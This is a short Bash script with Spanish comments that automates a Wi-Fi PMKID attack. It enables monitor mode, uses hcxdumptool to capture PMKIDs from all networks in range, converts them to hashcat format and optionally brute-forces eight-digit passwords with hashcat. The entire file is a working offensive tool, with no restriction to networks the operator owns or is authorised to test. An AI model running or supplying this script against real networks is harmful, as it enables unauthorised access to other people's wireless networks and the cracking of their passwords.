#!/bin/bash

#Colores
verde="\e[0;32m\033[1m"
rojo="\e[0;31m\033[1m"
azul="\e[0;34m\033[1m"
amarillo="\e[0;33m\033[1m"
morado="\e[0;35m\033[1m"
turquesa="\e[0;36m\033[1m"
gris="\e[0;37m\033[1m"
fin="\033[0m\e[0m"

#Fecha
NOW=$( date '+%F_%H:%M:%S' )

#Ayuda
if [[ $1 == "" ]]; then
	echo -e "${amarillo}Usage: sudo auto-pmkid.sh <Interface> <Scan Time(seconds)>${fin} ${rojo}Optional BruteForce -b${fin}"
	exit
elif [[ $1 == "-h" ]]; then
	echo -e "${amarillo}Usage: sudo auto-pmkid.sh <Interface> <Scan Time(seconds)>${fin} ${rojo}Optional BruteForce -b${fin}"
	exit
fi

#Modo monito y eliminar procesos conflictivos
sudo airmon-ng start $1
sudo airmon-ng check kill

#Captura de todos los PMKID
sudo hcxdumptool -i $1mon -o captura$NOW.pcapng --active_beacon --enable_status=15 &>/dev/null &
sleep $2 && sudo killall hcxdumptool

#Conversion del los hashes a formato hashcat
sudo hcxpcapngtool -o hash$NOW.hc22000 -E essidlist captura$NOW.pcapng
RUTA_HASH=$(readlink -e hash$NOW.hc22000)
echo -e "${verde}Los hashes fureon almacenados en un archivo ${turquesa}hash$NOW.hc22000${fin} compatible con hashcat (-m 22000)"
echo -e $RUTA_HASH

#Fuerza bruta con hashcat
if [[ $3 == "-b" ]];then
	sudo hashcat -m 22000 hash$NOW.hc22000 -a 3 '?d?d?d?d?d?d?d?d'
	sudo hashcat -m 22000 hash$NOW.hc22000 -a 3 '?d?d?d?d?d?d?d?d' --show
fi
exit
